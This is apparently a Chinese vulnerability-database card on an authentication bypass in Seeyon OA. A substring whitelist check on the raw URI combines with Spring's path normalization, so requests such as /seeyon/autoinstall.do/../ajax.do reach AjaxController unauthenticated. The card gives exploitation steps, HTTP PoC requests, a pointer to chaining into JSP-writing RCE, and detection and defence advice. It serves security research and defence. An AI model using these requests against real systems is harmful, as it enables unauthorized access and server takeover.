---
id: web-java-component-seeyon-ajaxdo-needless-urlmap-path-normalization-auth-bypass
title: 致远 OA ajax.do 未授权访问：needlessUrlMap 子串匹配叠加 Spring UrlPathHelper 路径规范化，借 /main.do/../ajax.do 或 /autoinstall.do/../ajax.do 绕过 CTPSecurityFilter
type: scenario
domain: web
path: web/java/component
technique: seeyon-ctpsecurityfilter-needless-urlmap-path-normalization-ajaxdo-unauth
aliases:
- 致远OA ajax.do 未授权访问
- /main.do/../ajax.do
- /autoinstall.do/../ajax.do
- isNeedlessCheckLogin 绕过
- needlessUrlMap 子串匹配
- Spring alwaysUseFullPath false 鉴权绕过
- 致远 V7.1SP1 ajax.do 权限绕过
tags:
- java
- seeyon
- oa
- ajax
- auth-bypass
- access-control
- path-normalization
- path-traversal
- spring
- servlet-filter
- needless-urlmap
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V652
  verified_at: '2026-11-13T05:08:52+08:00'
  notes: 已对照原文全文与49张截图核对：web.xml CTPSecurityFilter 映射 *.do、isSpringController 代码、authenticate/isNeedlessCheckLogin 流程、needlessUrlMap size=31（/main.do 15项不含 ajaxAction、/autoinstall.do 仅"*"）、UrlPathHelper alwaysUseFullPath=false 时走 getPathWithinServletMapping、spring-default.xml 中 /ajax.do→AjaxController、invokeService/invokeMethod/judgeCandidate/findMethodAndArgs 与实测响应 {"message":"can not find the method [listPage], which has 0 arguments.","code":"0234493455"} 均与截图一致。affected_versions：原文仅写"本次分析版本v7.1sp1"，属分析/测试环境版本、无受影响区间表述，按约定 clear（未猜）。dedup：dup-scan 无涉及本卡 pair，formulaManager 等候选均 related、非同链。未验证点：未执行文中 PoC；Spring 版本细节未本地复现。
---

## 一句话结论

致远 OA 的 `CTPSecurityFilter` 在未登录时调用 `isNeedlessCheckLogin`：它把 `getRequestURI()` 得到的原始路径（或 AJAX 请求的 `managerName` 参数）与 31 项 `needlessUrlMap` 的 key 逐个做 `indexOf(...) != -1` 子串匹配，命中后再看方法名是否在该 key 的免登录方法集合里（`contains("*") || contains(method)`）。由于 Spring `UrlPathHelper.alwaysUseFullPath=false` 时 `getPathWithinServletMapping` 会把 `..` 规范化后路由到真正目标，而过滤器看到的仍是含 `../` 的原始 URI，攻击者用 `/seeyon/main.do/../ajax.do`（默认 `method=index` 命中 `/main.do` 的免登录方法）或 `/seeyon/autoinstall.do/../ajax.do?method=ajaxAction`（`/autoinstall.do` 的方法集合为 `*`）即可未登录进入 `/ajax.do` 的 `AjaxController`，反射调用任意已注册 Manager（bean）的任意 public 方法。

## 原理

- **过滤器注册**：`/seeyon/WEB-INF/web.xml` 把 `com.seeyon.ctp.common.web.filter.CTPSecurityFilter`（`SecurityFilter`）映射到 `*.do`，所有 `.do` 请求先过它。
- **进入 SpringController 认证分支**：`doFilter` 取 `uri = request.getRequestURI()`，先调 `isSpringController(uri, req)`；其实现为 `boolean result = uri.endsWith(".do"); return !result && uri.indexOf(".do;jsessionid=") > 0 ? true : result;`。命中后执行 `authenticator = this.controllerAuthenticator; accept = authenticator.authenticate(req, resp);`，仅当 `accept && isAjax` 才再走 `ajaxAuthenticator`。
- **未登录判定**：`SpringControllerAuthenticator.authenticate` 先 `AppContext.getSessionContext("com.seeyon.current_user")` 取当前用户，取不到（`user == null`）时调用 `this.isNeedlessCheckLogin(context)`；返回 false 则再 `LoginTokenUtil.checkLoginToken(request)`，之后 `requireLogin && !isGuest` 时进入 `checkOnlineState(context)`，未登录状态返回 false，最终 `authenticate` 返回 false，过滤器不执行 `filterChain.doFilter`（返回“被迫下线/与服务器失去连接”页面）。
- **免登录判断缺陷（子串匹配）**：`isNeedlessCheckLogin` 中：
  ```java
  String accessUrl = request.getRequestURI();
  String method = this.getRealMethodName(context); // 取 method 参数，默认 index
  if (context.isAjax()) { accessUrl = context.getParameter("managerName"); }
  Map<String, Set<String>> needlessUrlMap = this.checkLoginAnnotationAware.getNeedlessUrlMap();
  for (String key : needlessUrlMap.keySet()) {
      if (accessUrl.indexOf(key) != -1) {           // 子串包含，而非精确路径
          Set<String> methods = needlessUrlMap.get(key);
          needlessUrl = methods.contains("*") || methods.contains(method);
          if (needlessUrl) break;
      }
  }
  ```
  两个判定统一来自“攻击者可见的原始字符串”：`accessUrl` 是原始 URI（非 AJAX）或 `managerName` 参数（AJAX，未传则为 null，在 `indexOf` 处直接 NPE），`method` 来自 `method` 请求参数且默认 `index`。
- **needlessUrlMap 内容**：共 31 项，包含 `/main.do`（方法集合 15 项：`index`、`login`、`main`、`changeLocale`、`hangup`、`headerjs`、`logout` 等，**不含 `ajaxAction`**）、`/autoinstall.do`（集合仅一项 `*`）、`/fileDownload.do`、`/uploadService.do` 等。
- **Spring 路径规范化造成视图差异**：本版本 `org.springframework.web.util.UrlPathHelper.alwaysUseFullPath=false`（低版本默认），`getLookupPathForRequest` 走 `getPathWithinServletMapping(request)`，对 URI 解码并解析 `..` 跨目录，最终把 `/seeyon/main.do/../ajax.do` 路由到 `/ajax.do`（`spring-default.xml` 中 `<bean name="/ajax.do" class="com.seeyon.ctp.common.service.AjaxController" autowire="byName"/>`）；而过滤器里的 `request.getRequestURI()` 仍是带 `../` 的原始串，因此 `accessUrl` 能包含白名单 key 的子串。
- **为什么两条路径可行**：
  - `/seeyon/main.do/../ajax.do` 不带 `method`，`getRealMethodName` 取默认 `index`；`accessUrl` 含 `/main.do` 且 `/main.do` 方法集合含 `index` → `needlessUrl=true`，绕过登录。
  - 一旦要带 `method=ajaxAction` 调用 Manager，`ajaxAction` 不在 `/main.do` 的 15 个免登录方法里，`/main.do` 前缀失效；改用 `/seeyon/autoinstall.do/../ajax.do?method=ajaxAction...`，`/autoinstall.do` 的方法集合是 `*`，任意 `method` 都命中。
- **未授权任意 Manager 方法调用**：绕过过滤器后进入 `AjaxController.ajaxAction` → `invokeService(request,response)`：`managerName` 作为 bean 名经 `AppContext.getBean`（`beanCacheMap` 缓存数百个 Manager）取出对象（`DataSource/Session/SessionFactory` 类型被拒绝），`managerMethod` 与解压后的 `arguments`（JSON 数组，支持 gzip）交给 `invokeMethod`：按 `服务名_方法名_参数个数` 查方法缓存，未命中用 `judgeCandidate` 反射遍历 `service.getClass().getMethods()` 匹配方法名与参数个数，`findMethodAndArgs` 按目标参数类型逐个转换（String 默认空串、Date、Map、其余 JSON 反序列化），最后 `target.invoke(service, args)`。整个过程无任何角色/登录校验，构成未授权任意已注册 bean 的任意 public 方法调用原语。

## 触发条件

- 目标为使用 `CTPSecurityFilter` + Spring MVC 且 `alwaysUseFullPath=false`（低版本默认）的致远 OA；原文分析版本 v7.1sp1。
- `/seeyon/ajax.do` 从攻击者网络可达。
- 无需任何登录会话（本卡核心是未授权入口）。
- 最终危害取决于被调用的 Manager 方法；调用本身已由原文实测（`constDefManager` 报方法不存在、`fileToExcelManager` 返回 200）。

## 利用步骤

1. 未登录直接请求 `/seeyon/main.do/../ajax.do`，观察返回不再是登录/“被迫下线”页面（原文返回 200 异常处理页面），确认过滤器已放行、请求已到 AjaxController。
2. 需要带 `method=ajaxAction` 调用 Manager 时，改用 `/seeyon/autoinstall.do/../ajax.do?method=ajaxAction&managerName=<bean>&managerMethod=<method>`；`/autoinstall.do` 的 `*` 方法集合适配任意 method。
3. `arguments` 传 JSON 数组字符串；如用 gzip 需带 `requestCompress=gzip`，且必须复刻致远 `ZipUtil.compressResponse(listJson,"gzip","UTF-8")` 的“gzip 字节按单字节字符转换后再 URL 编码”格式，否则 `ZipUtil.uncompressRequest` 解压失败。
4. 依据响应判断调用结果：原文用 `constDefManager&managerMethod=listPage` 得到 500 `{"message":"can not find the method [listPage], which has 0 arguments.","code":"0234493455"}`，说明已进入反射调用流程；换成存在的 Manager 方法即生效。
5. 衔接危险方法（如 `fileToExcelManager.saveExcelInBase` 写 JSP）完成 RCE。

## PoC

```http
GET /seeyon/main.do/../ajax.do HTTP/1.1
Host: target
Connection: close
```

```http
GET /seeyon/autoinstall.do/../ajax.do?method=ajaxAction&managerName=constDefManager&managerMethod=listPage HTTP/1.1
Host: target
Connection: close
```

原文实测响应（第二条）：HTTP 500，`Content-Type: application/json`，响应体：

```json
{"message":"can not find the method [listPage], which has 0 arguments.","code":"0234493455","details":null}
```

复核要点：

- 直接请求 `/seeyon/ajax.do` 未登录会失败（原文为 404/异常页）；带 `method=ajaxAction` 的 `/main.do/../ajax.do` 变体仍会被拦截（`ajaxAction` 不在 `/main.do` 方法集合），必须换 `/autoinstall.do` 前缀。
- AJAX 型请求（`context.isAjax()` 为真）时 `accessUrl` 改取 `managerName`，未传 managerName 会 NPE；上述绕过使用非 AJAX 请求，`accessUrl` 为原始 URI。

## 变体与关联

- 关联：[[web-java-component-seeyon-ajaxdo-formulamanager-groovy-file-write-jsp]]（同为 ajax.do 反射调用，但为登录后利用，sink 是 formulaManager 的 Groovy 注入写 JSP；本卡补足未授权入口）。
- 关联：[[web-java-component-seeyon-filetoexcelmanager-saveexcelinbase-arbitrary-file-write-jsp]]（本入口衔接的文件写入 RCE sink）。
- 关联：[[web-java-component-seeyon-ctpsecurityfilter-servlet-auth-gap]]（同一过滤器的另一处鉴权缺口：servlet 白名单之外的 `defaultAuthenticator`）。
- 关联：[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（“鉴权看原始路径、路由看规范化路径”的通用根因）、[[web-generic-auth-oa-downloadfilter-protectfilter-path-substring-bypass]]（`indexOf` 子串白名单的通用绕过范式）。
- 变体：`needlessUrlMap` 中任何 key 都可作为路径前缀片段（如 `/fileDownload.do`、`/uploadService.do` 等），只要目标 URI 含该子串且 `method` 命中该 key 的方法集合；`/autoinstall.do` 的 `*` 是最通用的一条。
- 边界：高版本/修复后 Spring 可能不再以 `alwaysUseFullPath=false` 解析、过滤器可能改用规范化后的路径或精确匹配；原文分析版本 v7.1sp1 已验证。

## 检测与防御

- 检测：访问日志中出现 `/seeyon/*/../ajax.do`、URI 含 `..` 且以 `.do` 结尾的请求；未登录状态下对 `/seeyon/ajax.do` 及其变体的 200/500 业务响应。
- 检测：`ajax.do` 请求中的 `managerName`/`managerMethod`/`arguments` 参数组合异常（如 `managerName=fileToExcelManager`、`managerMethod=saveExcelInBase`），以及高熵 URL 编码的 `arguments`。
- 防御：升级官方修复版本；过滤器改用规范化路径（或 Spring 实际路由路径）做精确匹配，禁止对原始 URI 使用 `indexOf` 子串判断。
- 防御：移除 `needlessUrlMap` 中的通配 `*`，逐接口收紧免登录方法白名单；`/ajax.do` 强制会话认证与角色校验。
- 防御：Spring 设置 `alwaysUseFullPath=true` 或升级；在网关/WAF 层拒绝含 `../` 的 `.do` 请求。
